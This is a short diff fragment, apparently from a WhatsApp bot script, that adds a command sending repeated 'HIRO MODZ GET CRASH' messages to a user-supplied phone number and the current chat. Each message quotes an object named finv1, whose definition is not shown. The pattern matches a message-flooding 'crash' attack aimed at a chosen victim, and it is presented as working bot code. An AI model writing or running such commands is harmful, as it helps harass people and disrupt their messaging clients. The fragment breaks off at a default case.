+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
 await m.reply(`Succes`)
 default:
 if (budy.startsWith('=>')) {
